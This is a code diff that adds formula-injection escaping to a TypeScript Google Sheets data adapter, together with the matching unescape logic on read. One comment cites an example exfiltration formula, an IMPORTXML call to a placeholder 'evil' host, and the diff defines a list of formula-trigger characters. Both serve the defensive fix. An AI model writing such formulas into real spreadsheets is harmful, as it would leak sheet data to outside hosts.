@@ -18,6 +18,19 @@ export type ColumnType =
   | 'object' 
   | 'json'
 
+/**
+ * Leading characters that make Sheets parse a written cell as a formula.
+ * `setValue`/`setValues` parse their input the way a user typing into the UI
+ * would, so '=' opens a formula, '+'/'-' open one for Lotus/Excel
+ * compatibility, and '@' is the legacy function prefix. Tab and CR are
+ * included because they are stripped before parsing, exposing whatever
+ * follows them (the OWASP formula-injection set).
+ */
+const FORMULA_TRIGGER_CHARS = ['=', '+', '-', '@', '\t', '\r']
+
+/** Prefix that forces Sheets to store a written cell as literal text. */
+const TEXT_PREFIX = "'"
+
 /** SheetsAdapter configuration options */
 export interface SheetsAdapterOptions {
   /** Spreadsheet ID (optional - uses active spreadsheet if not provided) */
@@ -51,6 +64,17 @@ export interface SheetsAdapterOptions {
    * Example: { labels: 'string[]', metadata: 'object' }
    */
   columnTypes?: Record<string, ColumnType>
+  /**
+   * Write string values verbatim, so a value starting with '=' becomes a live
+   * formula (default: false).
+   *
+   * The default escapes formula-opening characters, because any string that
+   * reaches a cell unescaped is executed by Sheets — a user-supplied
+   * `'=IMPORTXML("http://evil/","//x")'` would exfiltrate the sheet (#130).
+   * Only enable this for stores whose values are authored by the script
+   * itself and are meant to be formulas; never for user input.
+   */
+  allowFormulas?: boolean
 }
 
 
@@ -66,6 +90,7 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
   private createIfNotExists: boolean
   private idMode: IdMode
   private columnTypes: Record<string, ColumnType>
+  private allowFormulas: boolean
 
   // Sheet reference cache
   private _sheet: GoogleAppsScript.Spreadsheet.Sheet | null = null
@@ -81,7 +106,8 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
     this.createIfNotExists = options.createIfNotExists ?? true
     this.idMode = options.idMode ?? 'auto'
     this.columnTypes = options.columnTypes ?? {}
-    
+    this.allowFormulas = options.allowFormulas ?? false
+
     // Validate that id column is in columns
     if (!this.columns.includes(this.idColumn)) {
       throw new Error(`ID column '${this.idColumn}' must be included in columns`)
@@ -139,7 +165,49 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
     this._dataCache = null
   }
 
-  /** 
+  /**
+   * Prefix a string that Sheets would otherwise parse as a formula with the
+   * plain-text marker, so it is stored as the literal text it is (#130).
+   *
+   * A value already starting with the marker is escaped too, so it survives
+   * the round trip instead of losing its first character to the parser.
+   * Non-strings are returned untouched — numbers, booleans and Dates cannot
+   * open a formula.
+   */
+  private escapeCellValue(value: unknown): unknown {
+    if (this.allowFormulas) return value
+    if (typeof value !== 'string' || value.length === 0) return value
+
+    const first = value.charAt(0)
+    if (first === TEXT_PREFIX || FORMULA_TRIGGER_CHARS.indexOf(first) !== -1) {
+      return TEXT_PREFIX + value
+    }
+    return value
+  }
+
+  /**
+   * Inverse of {@link escapeCellValue}.
+   *
+   * Real Sheets consumes the marker while parsing the write, so escaped cells
+   * usually come back already unescaped and this is a no-op. Stores that keep
+   * the written text verbatim (the testing fakes, a cell pre-formatted as
+   * plain text, an imported CSV) hand the marker back, and it is dropped here.
+   * The marker is only honored in front of a character that would have needed
+   * escaping, so an apostrophe belonging to the data (`"'quoted"`) is kept.
+   */
+  private unescapeCellValue(value: unknown): unknown {
+    if (this.allowFormulas) return value
+    if (typeof value !== 'string' || value.length < 2) return value
+    if (value.charAt(0) !== TEXT_PREFIX) return value
+
+    const next = value.charAt(1)
+    if (next === TEXT_PREFIX || FORMULA_TRIGGER_CHARS.indexOf(next) !== -1) {
+      return value.slice(1)
+    }
+    return value
+  }
+
+  /**
    * Convert sheet row (array) to object
    * Uses schema-based types if available, falls back to auto-detection
    */
@@ -147,7 +215,7 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
     const obj: Record<string, unknown> = {}
     for (let i = 0; i < this.columns.length; i++) {
       const col = this.columns[i]
-      let value = values[i]
+      let value = this.unescapeCellValue(values[i])
       const colType = this.columnTypes[col]
 
       // Normalize GAS Dates to ISO strings for consistency — except for
@@ -232,25 +300,30 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
    * Uses schema-based types if available, falls back to auto-detection
    */
   private objectToRow(obj: Partial<T>): unknown[] {
-    return this.columns.map(col => {
-      const value = obj[col as keyof T]
-      const colType = this.columnTypes[col]
-      
-      // Convert undefined/null to empty string for Sheets
-      if (value === undefined || value === null) return ''
-      
-      // Schema-based serialization
-      if (colType) {
-        return this.serializeByType(value, colType)
-      }
-      
-      // Auto-detect: serialize arrays and objects to JSON
-      if (Array.isArray(value)) return JSON.stringify(value)
-      if (typeof value === 'object' && value !== null && !(value instanceof Date)) {
-        return JSON.stringify(value)
-      }
-      return value
-    })
+    // Every serialized cell goes through escapeCellValue, so no user-supplied
+    // string can reach the sheet as a live formula (#130).
+    return this.columns.map(col => this.escapeCellValue(this.serializeCell(obj, col)))
+  }
+
+  /** Serialize a single column of `obj` to its sheet representation */
+  private serializeCell(obj: Partial<T>, col: string): unknown {
+    const value = obj[col as keyof T]
+    const colType = this.columnTypes[col]
+
+    // Convert undefined/null to empty string for Sheets
+    if (value === undefined || value === null) return ''
+
+    // Schema-based serialization
+    if (colType) {
+      return this.serializeByType(value, colType)
+    }
+
+    // Auto-detect: serialize arrays and objects to JSON
+    if (Array.isArray(value)) return JSON.stringify(value)
+    if (typeof value === 'object' && value !== null && !(value instanceof Date)) {
+      return JSON.stringify(value)
+    }
+    return value
   }
 
   /** Serialize value based on column type */
@@ -363,8 +436,9 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
     
     const idColIndex = this.columns.indexOf(this.idColumn) + 1
     const idRange = sheet.getRange(2, idColIndex, lastRow - 1, 1)
-    const ids = idRange.getValues().flat()
-    
+    // Unescape so a stored id keeps matching the id the caller passes (#130).
+    const ids = idRange.getValues().flat().map(rowId => this.unescapeCellValue(rowId))
+
     // Support both string and number comparison
     const rowOffset = ids.findIndex(rowId => rowId === id || String(rowId) === String(id))
     return rowOffset === -1 ? -1 : rowOffset + 2 // +2 for header row and 1-indexing
@@ -476,7 +550,7 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
       // Cheap re-verification of the row we are about to overwrite — free here
       // because the row was read anyway, and it still guards the unlocked
       // (LockService-less) path.
-      const currentId = currentValues[this.columns.indexOf(this.idColumn)]
+      const currentId = this.unescapeCellValue(currentValues[this.columns.indexOf(this.idColumn)])
       if (currentId !== id && String(currentId) !== String(id)) return undefined
 
       const currentRow = this.rowToObject(currentValues)
@@ -583,7 +657,8 @@ export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
     const updatedRows: { rowIndex: number; values: unknown[] }[] = []
 
     for (let i = 0; i < allData.length; i++) {
-      const rowId = allData[i][idColIndex] as string | number
+      // Unescape so an escaped id still matches the caller's id (#130).
+      const rowId = this.unescapeCellValue(allData[i][idColIndex]) as string | number
       const updateData = updateMap.get(rowId) ?? updateMap.get(String(rowId))
       
       if (updateData) {
